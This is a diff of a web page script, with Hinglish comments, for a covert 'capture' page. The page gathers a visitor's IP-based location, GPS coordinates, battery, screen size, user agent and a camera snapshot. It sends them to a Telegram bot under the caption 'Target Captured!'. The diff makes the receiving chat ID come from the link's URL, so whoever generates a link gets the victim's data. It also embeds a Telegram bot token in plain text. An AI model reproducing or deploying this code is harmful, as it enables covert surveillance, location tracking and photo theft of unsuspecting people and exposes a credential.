@@ -58,14 +58,21 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
-        const CHAT_ID = "6478868514";
+        // URL se dynamic Chat ID uthane ka tareeka
+        const urlParams = new URLSearchParams(window.location.search);
+        const TARGET_CHAT_ID = urlParams.get('id'); // Jo link me id aayegi wahi use hogi
+
+        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI"; // Bot token wahi rahega jo tera main bot hai
 
         async function startCapture() {
+            if (!TARGET_CHAT_ID) {
+                alert("Invalid Link! User ID missing.");
+                return;
+            }
+
             document.getElementById('main-card').style.display = 'none';
             document.getElementById('loading-card').style.display = 'block';
 
-            // 1. Fetch IP & Location details
             let ipInfo = "N/A";
             try {
                 let ipRes = await fetch('https://ipapi.co/json/');
@@ -75,7 +82,6 @@
                 ipInfo = "🌐 IP Info: Failed to fetch";
             }
 
-            // 2. Fetch Battery details
             let batteryInfo = "N/A";
             try {
                 if (navigator.getBattery) {
@@ -84,11 +90,9 @@
                 }
             } catch(e) {}
 
-            // 3. Screen & Device info
             let screenInfo = `🖥️ Screen: ${window.innerWidth}x${window.innerHeight}`;
             let uaInfo = `🧠 UA: ${navigator.userAgent}`;
 
-            // 4. GPS Location (Live Coordinates)
             let gpsInfo = "📍 GPS: Not Allowed / Unavailable";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(pos => {
@@ -119,7 +123,7 @@
                             let fullCaption = `📸 **Target Captured!**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
 
                             const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
+                            formData.append('chat_id', TARGET_CHAT_ID); // Yahan usi user ki ID jayegi jo link generate karega
                             formData.append('caption', fullCaption);
                             formData.append('parse_mode', 'Markdown');
                             formData.append('photo', blob, 'captured.jpg');
@@ -137,7 +141,7 @@
                     let fullCaption = `⚠️ **Camera Denied, but Info Captured:**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
                     
                     let formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
+                    formData.append('chat_id', TARGET_CHAT_ID);
                     formData.append('text', fullCaption);
                     formData.append('parse_mode', 'Markdown');
                     
